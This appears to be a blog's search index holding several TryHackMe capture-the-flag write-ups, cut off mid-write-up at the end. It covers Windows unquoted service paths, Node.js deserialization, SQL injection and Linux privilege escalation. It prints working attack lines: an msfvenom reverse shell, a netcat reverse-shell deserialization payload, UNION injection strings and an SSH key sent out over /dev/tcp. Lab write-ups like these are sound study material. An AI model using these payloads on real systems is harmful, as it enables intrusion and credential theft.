[ { "title": "Quotient", "url": "/posts/Quotient/", "categories": "Windows, Tryhackme", "tags": "Windows, TryHackMe", "date": "2022-09-26 00:00:00 +0530", "snippet": "Room about exploiting Unquoted Path vulnerability.We were provided with the username and the password to login:sage: gr33ntHEphgK2&amp;VUsing xfreerdp, we can get RDP session on the box.xfreerdp /u:sage /p:&lt;pass&gt; /v:&lt;target_ip&gt;Basic EnumerationFirst thing first, we’ll look at all the users on the box.We only have two accounts, Administrator and sage. Next, we’ll look at the permission our user have:Our user have shutdown rights. Enumerating more about our userLooking for some non-default files on the box, we found:Both folder name contained empty spaces, this remind of Unqouted Service path. We can enumerate using either powerup or manully.ManualC:\\Users\\Sage&gt;wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"Developmenet Service Development Service C:\\Program Files\\Development Files\\Devservice Files\\Service.exe AutoC:\\Users\\Sage&gt;sc qc \"Development Service\"[SC] QueryServiceConfig SUCCESSSERVICE_NAME: Development Service TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Program Files\\Development Files\\Devservice Files\\Service.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Developmenet Service DEPENDENCIES : SERVICE_START_NAME : LocalSystemUsing Powerup.ps1PS C:\\Users\\Sage\\Documents&gt; get-unquotedserviceServiceName : Development ServicePath : C:\\Program Files\\Development Files\\Devservice Files\\Service.exeModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory}StartName : LocalSystemAbuseFunction : Write-ServiceBinary -Name 'Development Service' -Path &lt;HijackPath&gt;CanRestart : FalseName : Development ServiceFrom both methods, we found the BinaryPath was not in qoutes. To exploit this vulnerability, next thing we need is a writable directory. To enumerate all the directories in path to find which one has write access,we can use icacls.C:\\Program Files&gt;icacls \"Development Files\"Development Files BUILTIN\\Users:(W) NT SERVICE\\TrustedInstaller:(I)(F) NT SERVICE\\TrustedInstaller:(I)(CI)(IO)(F) NT AUTHORITY\\SYSTEM:(I)(F) NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(IO)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F) BUILTIN\\Users:(I)(RX) BUILTIN\\Users:(I)(OI)(CI)(IO)(GR,GE) CREATOR OWNER:(I)(OI)(CI)(IO)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)ExploitationCreate a malicious binary using msfvenom or any other tool.msfvenom -p windows/shell_reverse_tcp lhost=IP lport=9991 -f exe &gt; s.exeTransger the binary to target machine and place it in the folder to which we have write access and rename our malicious exe, according to path.PS C:\\Users\\Sage\\Documents&gt; dir 'C:\\Program Files\\Development Files\\' Directory: C:\\Program Files\\Development FilesMode LastWriteTime Length Name---- ------------- ------ ----d----- 3/7/2022 3:03 AM Devservice Files-a---- 8/8/2022 11:17 AM 73802 Devservice.exeHere, we can try to restart the service using net start &lt;service_name&gt; but we dont have the privs to do so. As service is an autorun service, we can restart the system and setup a listener on our attacker box to catch the shellC:\\Windows\\system32&gt;whoami whoamint authority\\system References https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/ https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths" }, { "title": "Vulnet Node", "url": "/posts/VULNET-Node/", "categories": "Linux, Tryhackme", "tags": "Linux, TryHackMe", "date": "2022-09-13 02:30:00 +0530", "snippet": "ENUMERATIONLets start with port scan.Nmap scan report for 10.10.94.18Host is up (0.23s latency).PORT STATE SERVICE VERSION8080/tcp open http Node.js Express framework|_http-open-proxy: Proxy might be redirecting requests|_http-title: VulnNet &amp;ndash; Your reliable news source &amp;ndash; Try Now!We have only one port open which is running nodejs. We can also verify this by HTTP-Headers.HEAD / HTTP/1.1HTTP/1.1 200 OKX-Powered-By: ExpressSet-Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D; Max-Age=1200; Path=/; Expires=Wed, 14 Apr 2021 18:32:37 GMT; HttpOnlyContent-Type: text/html; charset=utf-8Content-Length: 7599ETag: W/\"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co\"Date: Wed, 14 Apr 2021 18:12:37 GMTConnection: keep-aliveKeep-Alive: timeout=5We have a header X-Powered-By: Express which tells the server is running NodeJs. Also we have a cookie already without any login. Decoding the cookie{\"username\":\"Guest\",\"isGuest\":true,\"encoding\": \"utf-8\"}Changing username to admin and isGuest param to true, we were welcomed as admin. But nothing interesting. From this, lets try javascript deserialization attack.Using few blog post, came across a payload. Final payload{\"username\":\"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.5.42 9991 &gt;/tmp/f', function(error, stdout, stderr) { console.log(stdout) })\",\"isGuest\":true,\"encoding\": \"utf-8\"}Base64 encode this and send it to the server. We have a connection back.Shell as www-dataLooking at the server.js, we found the vulnerability. Our cookie was directly going in unserialize function without any sanitization.app.get('/', function(req, res) { if (req.cookies.session) { var str = new Buffer(req.cookies.session, 'base64').toString(); var obj = serialize.unserialize(str); if (obj.username) { var username2 = JSON.stringify(obj.username).replace(/[^0-9a-z]/gi, ''); obj.username = username2 res.render('../index', {username: obj.username})Checking for command with sudo rightsMatching Defaults entries for www on vulnnet-node: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www may run the following commands on vulnnet-node: (serv-manage) NOPASSWD: /usr/bin/npmWe have rights to run npm as serv-manage user. Tried running it in /tmp directory, but it was unsuccessful as we dont have write permission there. Only writable directory was /dev/shm and obv our home dir.cd /dev/shmecho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' &gt; package.jsonsudo -u serv-manage npm -C .iGot shell as serv-manage user and can grab user.txt now.ROOTChecking for sudo permission again for this user, we found:Matching Defaults entries for serv-manage on vulnnet-node: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser serv-manage may run the following commands on vulnnet-node: (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer (root) NOPASSWD: /bin/systemctl daemon-reloadCurrent user can start and stop vulnnet-auto.timer service. Looking at permission of this service, seems to be writable by serv-manage user.serv-manage@vulnnet-node:/dev/shm$ ls -la /etc/systemd/system/vulnnet-auto.timer-rw-rw-r-- 1 root serv-manage 167 Jan 24 16:59 /etc/systemd/system/vulnnet-auto.timerLooking at content of this service[Unit]Description=Run VulnNet utilities every 30 min[Timer]OnBootSec=0min# 30 min jobOnCalendar=*:0/30Unit=vulnnet-job.service[Install]WantedBy=basic.targetThis service was calling another service named vulnnet-job.service. Checking permission of the same and it was readable &amp; writable by our current user. Checking the contentDescription=Logs system statistics to the systemd journalWants=vulnnet-auto.timer[Service]# Gather system statisticsType=forkingExecStart=/bin/df[Install]WantedBy=multi-user.targetAs we can edit this file, we can change the ExecStart param to execute a malicious command.Description=Logs system statistics to the systemd journalWants=vulnnet-auto.timer[Service]# Gather system statisticsType=forkingExecStart=chmod +xs /bin/bash[Install]WantedBy=multi-user.targetThe above changes in the service does not seems to work. Changing ExecStart=chmod +xs /bin/bash to /bin/bash -c \"chmod +xs /bin/bash\".Description=Logs system statistics to the systemd journalWants=vulnnet-auto.timer[Service]# Gather system statisticsType=forkingExecStart=/bin/bash -c \"chmod +xs /bin/bash\"[Install]WantedBy=multi-user.targetStarting the service. And we have suid bit set on /bin/bashserv-manage@vulnnet-node:/dev/shm$ ls -la /bin/bash-rwsr-sr-x 1 root root 1113504 Apr 4 2018 /bin/bashNow we can simply use bash -p and we are root." }, { "title": "Vulnet Internal", "url": "/posts/VULNET-Internal/", "categories": "Linux, Tryhackme", "tags": "Linux, TryHackMe", "date": "2022-09-13 02:30:00 +0530", "snippet": "EnumerationStarting with nmapNmap scan report for 10.10.30.99 [29/40]Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA) | 256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA) |_ 256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 37917/tcp6 mountd | 100005 1,2,3 38732/udp mountd | 100005 1,2,3 38765/tcp mountd | 100005 1,2,3 59433/udp6 mountd | 100021 1,3,4 33219/udp6 nlockmgr | 100021 1,3,4 37285/tcp nlockmgr | 100021 1,3,4 45515/tcp6 nlockmgr | 100021 1,3,4 59572/udp nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)873/tcp open rsync (protocol version 31)2049/tcp open nfs_acl 3 (RPC #100227)9090/tcp filtered zeus-adminService Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: -1s|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: vulnnet-internal| NetBIOS computer name: VULNNET-INTERNAL\\x00| Domain name: \\x00| FQDN: vulnnet-internal|_ System time: 2021-05-08T08:52:56+02:00 | smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-05-08T06:52:56|_ start_date: N/AWe have few ports open. Lets start poking at them.SMBsmbclient -L //10.10.30.99Enter WORKGROUP\\root's password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers shares Disk VulnNet Business Shares IPC$ IPC IPC Service (vulnnet-internal server (Samba, Ubuntu))We have read access to shares directory. Looking at it, we found few files but nothing much interesting except the flag.NFSCheck what share is available to mountshowmount -e 10.10.30.99Export list for 10.10.30.99:/opt/conf *We can mount this share to access it on our local machine. Simply, mount 10.10.30.99:/opt/conf &lt;our_mount_dir&gt;. Now we can access the files locallyhpinitoptprofile.dredisvimwildmidiFew interesting files here. The hp folder, seems like a printer configuration file. We found an interesting file, redis folder which contains redis.conf file. But our nmap didnt find redis server running, running nmap for all ports, it found port 6379 running.Looking at redis.conf file, we found the authentication password.requirepass : B65Hx562F@ggAZ@FWe can now interact with redis server. Connect to it using nc, nc IP 6379.nc 10.10.30.99 6379 auth B65Hx562F@ggAZ@F +OK keys * *5 $8 authlist $10 marketlist $3 int $3 tmp$13internal flagdump \"internal flag\"FLAG# it does seems like base64 string with some extra data appended ( coz I dont know how to interact with redis that good enough.)dump authlist$156@Ac @pQXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==srFX\"R# We can list the above info using thistype authlist+listlrange authlist 1 100Decoding the base64 string we found password for rsyncAuthorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72vRSYNCrsync rsync://rsync-connect@10.10.30.99files Necessary home interactionrsync rsync://rsync-connect@10.10.30.99/files/sys-internal Password: drwxr-xr-x 4,096 2021/02/06 18:19:29 sys-internalrsync rsync://rsync-connect@10.10.30.99/files/sys-internal/Password: drwxr-xr-x 4,096 2021/02/06 18:19:29 ....[snip]...-rw------- 38 2021/02/06 17:24:25 user.txtdrwxrwxr-x 4,096 2021/05/08 13:15:17 .sshWe have .ssh folder but it was empty. No problem, we can upload our public key into it. Rename our public key to authorized_keys and upload itrsync authorized_keys rsync://rsync-connect@10.10.30.99/files/sys-internal/.ssh/Now we can ssh into the box.ROOTRunning linpeas didn’t find any usefull information. Looking at the listening ports$ ss -ltnptcp LISTEN 0 100 [::ffff:127.0.0.1]:8111 *:* This port was running a webserver, which we can confirm using curl/wget.Also there was a folder name TeamCity in the root directory which was being run by root. This could be potential priv esc vector.It was running on localhost, we can forward the port to usssh -i ../sys -L 8000:127.0.0.1:8111 sys-internal@10.10.30.99Now we can access the webserver on our localhost port 8000. It needs authentication, but we dont have any creds. Trying earlier found passwords and default but nothing.Looking at logs directory in the Teamcity folder, we found a logSuper user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)Super user authentication token: 9020742256179529134 (use empty username with the token as the password to access the server)Trying out the latest one, and it got accepted. We have super-user rights on it. We can make a project. For priv esc, we need to make a project -&gt; build configuration -&gt; build steps. Run a python script for reverse shell.Set-up a listner and we got connection back.ROOT!!" }, { "title": "Cyber Crafted", "url": "/posts/CyberCrafted/", "categories": "Tryhackme, Linux", "tags": "TryHackMe, Linux", "date": "2022-09-13 02:30:00 +0530", "snippet": "EnumearationAs always,starting our enumeration with nmapNmap scan report for 10.10.24.240Host is up (0.20s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)| 256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)|_ 256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Did not follow redirect to http://cybercrafted.thm/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.78 secondsLooking at results, we have port 22 and 80 open. Also we can see that HTTP server on port 80 redirects us to cybercrafted.thm domain. We have to add it to out hosts file,sudo vim /etc/hosts&lt;IP&gt; cybercrafted.thmPort 80It was hosting a static webpage, with a background image and a message statingBoth online store and Minecraft servers are in development. Running ffuf for directory brute-forcing,________________________________________________ :: Method : GET :: URL : http://cybercrafted.thm/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.htpasswd [Status: 403, Size: 281, Words: 20, Lines: 10].htaccess [Status: 403, Size: 281, Words: 20, Lines: 10]assets [Status: 301, Size: 321, Words: 20, Lines: 10]secret [Status: 301, Size: 321, Words: 20, Lines: 10]server-status [Status: 403, Size: 281, Words: 20, Lines: 10]There’s directory named /secret, it contains some images, nothing interesting.Looking at the source-code of the page, we sawThe comment was clear indication that, there’s multiple webapps running on the same server. So our next task was to find vhosts running, we can use ffuf for thisffuf -u http://cybercrafted.thm/ -H 'Host: FUZZ.cybercrafted.thm' -w /usr/share/seclists/Discovery/DNS/namelist.txt -c -fw 1________________________________________________ :: Method : GET :: URL : http://cybercrafted.thm/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt :: Header : Host: FUZZ.cybercrafted.thm :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 1________________________________________________admin [Status: 200, Size: 937, Words: 218, Lines: 31]store [Status: 403, Size: 287, Words: 20, Lines: 10]www [Status: 200, Size: 832, Words: 236, Lines: 35]:: Progress: [1907/1907] :: Job [1/1] :: 250 req/sec :: Duration: [0:00:09] :: Errors: 0 ::We found two more vhosts, we need to add them to our host file in order to access them.Admin.cybercrafted.thmOn visiting the subdomain, we saw a admin login panel. We can try some default credentials but no luck.Fuzzing for hidden pages and directories also didn’t found anything interesting of use. Lets move on to nex subdomain.Store.cybercrafted.thmOn visiting the subdomain, we got 403 Forbidden error. Running ffuf for directory enumeration,└─$ ffuf -u http://store.cybercrafted.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt -c -e .php :: Method : GET :: URL : http://store.cybercrafted.thm/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Extensions : .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ .htpasswd [Status: 403, Size: 287, Words: 20, Lines: 10] .htaccess.php [Status: 403, Size: 287, Words: 20, Lines: 10] .htpasswd.php [Status: 403, Size: 287, Words: 20, Lines: 10] .htaccess [Status: 403, Size: 287, Words: 20, Lines: 10] assets [Status: 301, Size: 333, Words: 20, Lines: 10] search.php [Status: 200, Size: 838, Words: 162, Lines: 28] server-status [Status: 403, Size: 287, Words: 20, Lines: 10] The results gave us a page search.php, on navigating we have interface that allow us to search through a collection of items. As its a search functionality, we can try using some classic SQL Injection Payloads.Using ' or 1=1-- -, we got some results. This confirms the page was vulnerable to SQLi.Exploiting SQLiFor exploitation, we can use UNION-based Injection attacks. Starting off with ' UNION SELECT NULL-- - shows nothing in the results. That’s okay. We’ll keep adding NULLs until we get a successful return. With the query ' UNION SELECT NULL,NULL,NULL,NULL-- - we see some results. Now we now there are four columns.Next, we need to find out the tables, we can use ' UNION SELECT 1,table_name,3,4 from information_schema.tables where table_schema=database(), this will show all the tables in current database.The admin table was interesting, we can futher enumerate and dump the data for this table.The table contain 3 columns, ID, Username, Hash. We can dump the data using, ' UNION SELECT 1,id,username,hash from admin-- -.1:xXUltimateCreeperXx:88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01,4:web_flag:THM{bbe315906038c3a62d9b195001f75008}Cracking the HashWe have a username and password hash from the database dump. Running hashidon the hash, the hash was sha1. We can crack it using john. john --wordlist=rockyou.txt hash Warning: detected hash type \"Raw-SHA1\", but the string is also recognized as \"Raw-SHA1-AxCrypt\"Use the \"--format=Raw-SHA1-AxCrypt\" option to force loading these as that type insteadWarning: detected hash type \"Raw-SHA1\", but the string is also recognized as \"Raw-SHA1-Linkedin\"Use the \"--format=Raw-SHA1-Linkedin\" option to force loading these as that type insteadWarning: detected hash type \"Raw-SHA1\", but the string is also recognized as \"ripemd-160\"Use the \"--format=ripemd-160\" option to force loading these as that type insteadWarning: detected hash type \"Raw-SHA1\", but the string is also recognized as \"has-160\"Use the \"--format=has-160\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])Warning: no OpenMP support for this hash type, consider --fork=4Press 'q' or Ctrl-C to abort, almost any other key for statusdiamond123456789 (?)1g 0:00:00:02 DONE (2021-11-22 17:58) 0.4366g/s 3771Kp/s 3771Kc/s 3771KC/s diamond1336..diamond123123Use the \"--show --format=Raw-SHA1\" options to display all of the cracked passwords reliablySession completedCommand InjectionWe successfully cracked the hash. We can try ssh-ing to the box with these creds, but it didn’t work. We also had a Admin Panel. Using the credentials, we had a successful login.The webpage allow us to run commands on the system. There was no filtering/blacklisting so we can easily get a reverse shell using itShell as www-dataWe now have shell as www-data user. Looking in the directory, we have a file named dbConn.php. Checking the contentswww-data@cybercrafted:/var/www/admin$ cat dbConn.phpcat dbConn.php&lt;?php$db_host = \"localhost\";$db_user = \"root\";$db_pwd = \"\";$db_name = \"webapp\";$conn = mysqli_connect($db_host, $db_user, $db_pwd, $db_name);if (!$conn){ echo \"Connection Failed!\";There was no password being used to connect to database. Also we already dumped the data, so it was of no use.Checking other users available on the boxwww-data@cybercrafted:/var/www/admin$ cat /etc/passwd | grep sh$cat /etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashxxultimatecreeperxx:x:1001:1001:,,,:/home/xxultimatecreeperxx:/bin/bashcybercrafted:x:1002:1002:,,,:/home/cybercrafted:/bin/bashLooking in the home directory of each user, we had access to xxultimatecreeperxx user’s home directory. Also it contains ssh private key. We can transfer it to our boxand ssh into the target using private key as xxultimatecreeperxx user.# attackernc -lvnp 9991 &gt; id_rsa# victimcat /home/xxultimatecreeperxx/.ssh/id_rsa &gt; /dev/tcp/&lt;IP&gt;/9991The SSH-key had a passphrase. Once again, we can use John to crack it. We need to use ssh2john script which converts SSH-key into John readable format.Running john against the SSH-key’s hash and we got the passphrase. We can now login as user on the box. j hash Using default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 4 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press 'q' or Ctrl-C to abort, almost any other key for statuscreepin2006 (id_rsa)Warning: Only 2 candidates left, minimum 4 needed for performance.1g 0:00:00:08 DONE (2021-11-26 23:28) 0.1148g/s 1646Kp/s 1646Kc/s 1646KC/sa6_123..*7¡Vamos!Session completedShell as xxultimatecreeperxxWe now have shell as xxultimatecreeperxx user. The user was part of Minecraft group.xxultimatecreeperxx@cybercrafted:~$ iduid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)We found the minecraft server was running from /opt/minecraft directory. The directory also contained a notexxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)- cybercraftedP.SWill remove the whitelist soon.According to the note, Cybercrafted has added a new plugin to server. Looking at the Plugins, we foundxxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls -latotal 56drwxr-x--- 3 cybercrafted minecraft 4096 Jun 27 08:25 .drwxr-x--- 7 cybercrafted minecraft 4096 Jun 27 16:53 ..drwxr-x--- 2 cybercrafted minecraft 4096 Oct 6 09:59 LoginSystem-rwxr-x--- 1 cybercrafted minecraft 43514 Jun 27 08:24 LoginSystem_v.2.4.jarWithin the LoginSystem directory,drwxr-x--- 2 cybercrafted minecraft 4096 Oct 6 09:59 .drwxr-x--- 3 cybercrafted minecraft 4096 Jun 27 08:25 ..-rwxr-x--- 1 cybercrafted minecraft 667 Nov 21 14:25 language.yml-rwxr-x--- 1 cybercrafted minecraft 943 Nov 21 14:25 log.txt-rwxr-x--- 1 cybercrafted minecraft 90 Jun 27 13:32 passwords.yml-rwxr-x--- 1 cybercrafted minecraft 25 Nov 21 14:25 settings.ymlPassword.yml seems interesting. Looking at the content, we found MD5 password hash for two users.cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml cybercrafted: dcbf543ee264e2d3a32c967d663e979emadrinch: 42f749ade7f9e195bf475f37a44cafcbCracking it using crackstation, we were only able to crack password for madrinch. Looking at other files in directory, we foundxxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt [2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem![2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition&gt;Bedrock[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem![2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition&gt;Bedrock[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem![2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem![2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition&gt;Bedrock[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem![2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition&gt;Bedrock[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem![2021/06/27 11:59:01] madrinch logged in. PW: Password123We got password for cybercrafted user. We can now switch userShell as cybercraftedNow we have shell as cybercrafted usercybercrafted@cybercrafted:~$ iduid=1002(cybercrafted) gid=1002(cybercrafted) groups=1002(cybercrafted)cybercrafted@cybercrafted:~$ ls -latotal 32drwxr-x--- 4 cybercrafted cybercrafted 4096 Sep 12 10:33 .drwxr-xr-x 4 root root 4096 Jun 27 17:50 ..lrwxrwxrwx 1 root root 9 Sep 12 10:33 .bash_history -&gt; /dev/null-rwxr-x--- 1 cybercrafted cybercrafted 220 Jun 27 13:33 .bash_logout-rwxr-x--- 1 cybercrafted cybercrafted 3771 Jun 27 13:33 .bashrcdrwx------ 2 cybercrafted cybercrafted 4096 Sep 12 10:00 .cachedrwx------ 3 cybercrafted cybercrafted 4096 Sep 12 10:00 .gnupg-rwxr-x--- 1 cybercrafted cybercrafted 807 Jun 27 13:33 .profile-rw-r----- 1 cybercrafted cybercrafted 38 Jun 27 17:27 user.txtChecking for sudo privileges,cybercrafted@cybercrafted:~$ sudo -l[sudo] password for cybercrafted: Matching Defaults entries for cybercrafted on cybercrafted: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser cybercrafted may run the following commands on cybercrafted: (root) /usr/bin/screen -r cybercraftedThis user is allowed to run the command /usr/bin/screen -r cybercrafted with sudo. Screen is a windows manager for terminals much like tmux.From the manpage of screen, here we are attaching to an existing session (-r cybercrafted).Running the command dropped us in minecraft server console. Again from manpage, we found a way to spawn a new window with a shell ─────────────────────────────────────────────────────────────────────────────── C-a c, (screen) Create a new window with a shell and C-a C-c switch to that window. ───────────────────────────────────────────────────────────────────────────────So running the command, and pressing shortcut keys ctrl+a and c we get the root shellROOT!!" }, { "title": "Cat Pictures", "url": "/posts/Cat-Pictures/", "categories": "Linux, Tryhackme", "tags": "Linux, TryHackMe", "date": "2022-09-13 02:30:00 +0530", "snippet": "EnumerationStaring with nmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 23:25 ISTNmap scan report for 10.10.184.159Host is up (0.24s latency).PORT STATE SERVICE VERSION21/tcp filtered ftp22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)| 256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)|_ 256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)2375/tcp filtered docker4420/tcp open nvm-express?| fingerprint-strings: | DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: | INTERNAL SHELL SERVICE| please note: cd commands do not work at the moment, the developers are fixing it at the moment.| ctrl-c| Please enter password:| Invalid password...| Connection Closed| NULL, RPCCheck: | INTERNAL SHELL SERVICE| please note: cd commands do not work at the moment, the developers are fixing it at the moment.| ctrl-c|_ Please enter password:8080/tcp open http Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.271 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port4420-TCP:V=7.91%I=7%D=6/6%Time=60BD0C2A%P=x86_64-pc-linux-gnu%r(NU...[snip]...Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 150.86 secondsLooking at the results, we have port 22 and 8080 open but 21 being marked as filtered (Firewall?).Port 8080Looking at webpage, it was hosting a phpbb fourm.PHPbb is an open source project. Looking at Github repository of PHPbb, we get whole directory structure of the application. Navigating to /docs/CHANGELOG.html, we found the version of PHPbb is 3.3.3. Looking for publicly available for this version number, but we found nothing.Looking at the forum, we have one post which saysPort KnockingThe post says Knock,knock!! …… hmmm. This maybe a hint for port-knocking. According to wikipedia, Port knocking is method of externally opening ports on firewall by generating a connection attempt on a set of prespecified closed ports.In simple terms,It means that after knocking on ports in a specific sequence a certain port will open automatically. We can use nmap for this task,for i in 1111, 2222, 3333, 4444; do nmap -Pn --max-retries 0 -p $i 10.10.243.236; doneThe above command will check for specified ports, basically knocking at each specified ports only once and in sequence. Nmap default behaviour is to look for port more than once if it didn’t responded. We can modify it using max-retries flag, setting it to 0.FTPRunning nmap scan againStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 23:25 ISTNmap scan report for 